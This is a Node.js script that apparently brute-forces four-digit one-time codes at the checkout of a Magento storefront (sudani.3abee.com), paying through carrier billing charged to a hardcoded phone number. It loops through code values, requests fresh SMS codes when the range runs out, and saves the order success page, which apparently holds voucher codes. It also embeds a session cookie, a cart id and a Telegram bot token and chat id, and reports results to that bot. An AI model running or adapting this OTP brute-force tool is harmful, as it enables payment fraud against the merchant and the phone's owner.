var fs = require('fs'),
    path = require('path')
filePath = path.join(__dirname, '/index.html');
errfile = path.join(__dirname, '/error.txt');
const { exec } = require('child_process');
var scount = 0;
const fetch = require("node-fetch");

    
//mine_cart = "https://sudani.3abee.com/ar-sd/rest/sd/V1/carts/mine/payment-information";


timer = 0;
mins = 900;
phone = "113903233";
cart ="1ViRaeXW2tSbtbQLW6zAlshpOHAgERgz";
cookie ="PHPSESSID=v50gp99be0ngcb3mveuq5ocqlq"
 

server_errors = 0;
not_sent = 0;
network_errors = 0;
const { spawn } = require('child_process');
const child = spawn('clear');

child.stdout.on('data', (data) => {
    console.log(`stdout: ${data}`);
});

otp = 9000;
var args = process.argv.slice(2);

    var cart;
    //console.log("Fetched cart: "+cart)
choice = args[0];
 if(choice == "test"){
   otp = args[1];
    verify()
}else{
    sms()

}
/*
fetch("https://sudani.3abee.com/en-sd/checkout/cart/", {
    "headers": {
      "Cookie":"PHPSESSID=renzone",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
        "Accept": "application/json, text/javascript, *//*; q=0.01",
        "Accept-Language": "en-US,en;q=0.5",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Type": "multipart/form-data; boundary=----geckoformboundary3b001e8a6d32601098791642d52a93f6",
        "Alt-Used": "sudani.3abee.com",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0"
    },
    "referrer": "https://sudani.3abee.com/ar-sd/pubg-1-configurable.html",
    "method": "GET",
    "mode": "cors"
}).then(function(response) {
    return response.text();
  }).then(function(data) {
    ///console.log(data)
    var found = data.search("entity_id");key = data.substring(found+12,found+44);
    cart = cart.trim();)}
    */

otp = pad(otp,4)
function verify(){
  guest_cart = "https://sudani.3abee.com/ar-sd/rest/default/V1/guest-carts/"+cart+"/payment-information"
  otp++;
  otp = pad(otp,4)
 fetch(guest_cart, {
    "headers": {
        "User-Agent":  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:142.0) Gecko/20100101 Firefox/142.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/json",
        "X-Requested-With": "XMLHttpRequest",
        "Alt-Used": "sudani.3abee.com",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "Priority": "u=0",
        "Cookie": cookie
    },
    "referrer": "https://sudani.3abee.com/ar-sd/checkout/",
    "body": "{\"cartId\":\""+cart+"\",\"billingAddress\":{\"countryId\":\"SD\",\"street\":[\"street\"],\"telephone\":\"1234567890\",\"postcode\":\"12345\",\"city\":\"city\",\"firstname\":\"firstname\",\"lastname\":\"lastname\",\"saveInAddressBook\":0},\"paymentMethod\":{\"method\":\"dcb\",\"additional_data\":{\"phone\":\"249"+phone+"\",\"otp\":\""+otp+"\"}},\"email\":\"\"}",
    "method": "POST",
}).then(function(response) {
  status = response.status;
    return response.text();
  }).then(function(data) {
    p = JSON.parse(data)
    msg = p.message;
    if(status == 400){
      
    }else{
      
    //console.log(status);
    fetch("https://sudani.3abee.com/ar-sd/checkout/onepage/success/", {
        "headers": {
            "Cookie": cookie,
            "User-Agent": " User-Agent: Mozilla/5.0 (Android 15; Mobile; rv:141.0) Gecko/141.0 Firefox/141.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Priority": "u=0, i"
        },
        "referrer": "https://sudani.3abee.com/ar-sd/checkout/",
        "method": "GET",
       // "mode": "cors"
    }).then(function(response) {
  
        return response.text();
      }).then(function(data) {
        
        
   fs.writeFile(filePath, data,  { flag: 'w' },function(err) {  if(err) {  return console.log(code);  }  console.log("Success saving the file");}); 
//var found = data.search("voucher-code");
//code = source.substring(found+40,found+80);
//fetch('https://api.telegram.org/bot2007048049:AAFXFIrek_L-ubNzsy5tMMO7m8Kpimra0ew/sendMessage', {       method: 'POST', headers: {          'Content-Type': 'application/json'}, body: JSON.stringify({'chat_id': '1340393292',   'text': code,  'disable_notification': true }) });

      }).catch((error) => {
  fetch("https://sudani.3abee.com/ar-sd/checkout/onepage/success/", {
        "headers": {
            "Cookie": cookie,
            "User-Agent": " User-Agent: Mozilla/5.0 (Android 15; Mobile; rv:141.0) Gecko/141.0 Firefox/141.0",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "same-origin",
            "Sec-Fetch-User": "?1",
            "Priority": "u=0, i"
        },
        "referrer": "https://sudani.3abee.com/ar-sd/checkout/",
        "method": "GET",
       // "mode": "cors"
    }).then(function(response) {
  
        return response.text();
      }).then(function(data) {
        
        
   fs.writeFile(filePath, data,  { flag: 'w' },function(err) {  if(err) {  return console.log(code);  }  console.log("Success saving the file");
     
   }); 
   
//var found = data.search("voucher-code");
//code = source.substring(found+40,found+80);
//fetch('https://api.telegram.org/bot2007048049:AAFXFIrek_L-ubNzsy5tMMO7m8Kpimra0ew/sendMessage', {       method: 'POST', headers: {          'Content-Type': 'application/json'}, body: JSON.stringify({'chat_id': '1340393292',   'text': code,  'disable_notification': true }) });

      })
  
});
      
  if(choice == 1){
    fetch('https://api.telegram.org/bot2007048049:AAFXFIrek_L-ubNzsy5tMMO7m8Kpimra0ew/sendMessage', {       method: 'POST', headers: {          'Content-Type': 'application/json'}, body: JSON.stringify({'chat_id': '1340393292',   'text': "Success ",  'disable_notification': true }) });
}else{
      exec('termux-notification -c "Success!!!"', (err, stdout, stderr) => {
  if (err) { return;}
});
}

    }
  if(msg == "رمز التحقق غير صحيح. يرجى التأكد من صحة الرمز".trim()){
    //console.log("Wrong otp: " + otp)
  process.stdout.clearLine();
  process.stdout.cursorTo(0);
  datetime = new Date();
  m = datetime.getMinutes();
    h = datetime.getHours();
    process.stdout.write(" [ "+h+":"+m+" ] Wrong otp: " + otp + "| ");
    if(otp < 10000){
 verify()
    }else{
      console.log("Overlimit")
      sms();
    }
  }else if(msg == "لقد حدث خطأ ما" && timer > mins){
    console.log('Code expired '+otp)
    if(choice == "test"){
     console.log('Choice is test. '); 
    }else{
    sms()
    }
  }else if(msg == "لقد حدث خطأ ما" && timer < mins){
   // console.log('Code expired before timer:'+timer)
    otp--;
    verify();
  }else if(data == String.raw`{"message":"\u0644\u0642\u062f \u062d\u062f\u062b \u062e\u0637\u0623 \u0645\u0627","trace":"#0 \/var\/www\/html\/3abee\/vendor\/magento\/framework\/Interception\/Interceptor.php(58): Magento\\Checkout\\Model\\GuestPaymentInformationManagement->savePaymentInformationAndPlaceOrder()\n#1 \/var\/www\/html\/3abee\/vendor\/magento\/framework\/Interception\/Interceptor.php(138): Magento\\Checkout\\Model\\GuestPaymentInformationManagement\\Interceptor->___callParent()\n#2 \/var\/www\/html\/3abee\/vendor\/magento\/framework\/Interception\/Interceptor.php(153): Magento\\Checkout\\Model\\GuestPaymentInformationManagement\\Interceptor->Magento\\Framework\\Interception\\{closure}()\n#3 \/var\/www\/html\/3abee\/generated\/code\/Magento\/Checkout\/Model\/GuestPaymentInformationManagement\/Interceptor.php(23): Magento\\Checkout\\Model\\GuestPaymentInformationManagement\\Interceptor->___callPlugins()\n#4 [internal function]: Magento\\Checkout\\Model\\GuestPaymentInformationManagement\\Interceptor->savePaymentInformationAndPlaceOrder()\n#5 \/var\/www\/html\/3abee\/vendor\/magento\/module-webapi\/Controller\/Rest\/SynchronousRequestProcessor.php(95): call_user_func_array()\n#6 \/var\/www\/html\/3abee\/vendor\/magento\/module-webapi\/Controller\/Rest.php(202): Magento\\Webapi\\Controller\\Rest\\SynchronousRequestProcessor->process()\n#7 \/var\/www\/html\/3abee\/vendor\/magento\/framework\/Interception\/Interceptor.php(58): Magento\\Webapi\\Controller\\Rest->dispatch()\n#8 \/var\/www\/html\/3abee\/vendor\/magento\/framework\/Interception\/Interceptor.php(138): Magento\\Webapi\\Controller\\Rest\\Interceptor->___callParent()\n#9 \/var\/www\/html\/3abee\/vendor\/magento\/framework\/Interception\/Interceptor.php(153): Magento\\Webapi\\Controller\\Rest\\Interceptor->Magento\\Framework\\Interception\\{closure}()\n#10 \/var\/www\/html\/3abee\/generated\/code\/Magento\/Webapi\/Controller\/Rest\/Interceptor.php(23): Magento\\Webapi\\Controller\\Rest\\Interceptor->___callPlugins()\n#11 \/var\/www\/html\/3abee\/vendor\/magento\/framework\/App\/Http.php(116): Magento\\Webapi\\Controller\\Rest\\Interceptor->dispatch()\n#12 \/var\/www\/html\/3abee\/vendor\/magento\/framework\/App\/Bootstrap.php(264): Magento\\Framework\\App\\Http->launch()\n#13 \/var\/www\/html\/3abee\/pub\/index.php(57): Magento\\Framework\\App\\Bootstrap->run()\n#14 {main}"}` && timer < mins){
    otp--;
    verify();
  }else if(msg == "الرصيد المتوفرغير كافٍ. يرجى إعادة الشحن"){
    console.log('Not enough balance');
    fetch('https://api.telegram.org/bot2007048049:AAFXFIrek_L-ubNzsy5tMMO7m8Kpimra0ew/sendMessage', {       method: 'POST', headers: {          'Content-Type': 'application/json'}, body: JSON.stringify({'chat_id': '1340393292',   'text': "Not enough balance ",  'disable_notification': true }) });
    
    
  }else if(msg == "An error occurred on the server. Please try to place the order again."){
    server_errors++;
    if(server_errors < 70){
    otp--;
    verify()
    }else{
  console.log("Too many server errors")
  }
  }else if(msg == "حدث خطأ ما. يُرجى إعادة المحاولة لاحقًا"){
    otp--;
  
    verify()
   }else{
    //console.log(data)
 //   fs.writeFile(errfile, data,  { flag: 'w' },function(err) {  if(err) {  return console.log(code); }})
  //  console.log("Error file saved");}); 
   // fetch('https://api.telegram.org/bot2007048049:AAFXFIrek_L-ubNzsy5tMMO7m8Kpimra0ew/sendMessage', {       method: 'POST', headers: {          'Content-Type': 'application/json'}, body: JSON.stringify({'chat_id': '1340393292',   'text': "Error ",  'disable_notification': true }) });
  
    setTimeout(()=>{
      sms()
    },5000)


  }
    
  }).catch((error) => {
  //console.log(error)
  network_errors++;
  console.log("\n network error: "+network_errors + error)
  if(network_errors > 70 ){
    console.log("too many network errors")
  }else{
  otp--;
  setTimeout(()=>{
    verify();
  },3000)
  }
});
    

}
  
  
  
  function pad(num, size) {
    num = num.toString();
    while (num.length < size) num = "0" + num;
    return num;
}



function sms(){
  timer = 1;
  fetch("https://sudani.3abee.com/ar-sd//dcb/otp/send", {
     "headers": {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With": "XMLHttpRequest",
        "Priority": "u=0",
        "Cookie":cookie
    },
   
    "body": "phone=249"+phone,
  "method": "POST",

}).then(function(response) {
    return response.json();
  }).then(function(data) {
    if(data.success == true){
     datetime = new Date();
    m = datetime.getMinutes();
    h = datetime.getHours();
    scount++;
    console.log("[ "+scount+" ] Message sent: "+phone+ " [ "+h+":"+m+" ] ");
      
      if(choice == 1){
        fetch('https://api.telegram.org/bot2007048049:AAFXFIrek_L-ubNzsy5tMMO7m8Kpimra0ew/sendMessage', {       method: 'POST', headers: {          'Content-Type': 'application/json'}, body: JSON.stringify({'chat_id': '1340393292',   'text': "[ "+scount+" ] Message sent [ "+h+":"+m+" ] "+otp,  'disable_notification': true }) });
      }
      otp = 9000;
      verify()
    }else{
      not_sent++;
      if(not_sent == 50){
      console.log("Too many sms failures")
      }else{
  if(data.message == "لقد حدث خطأ ما"){
console.log("["+not_sent+"]"+"message not sent.");
      setTimeout(()=>{
    sms()
  },10000)
        }else{
          console.log("Unknown message"+JSON.stringify(data))
          setTimeout(()=>{
    sms()
  },10000)
        }
        
        
        
      }
      
    }
 });
}

setInterval(()=>{
  timer++;
},1000)
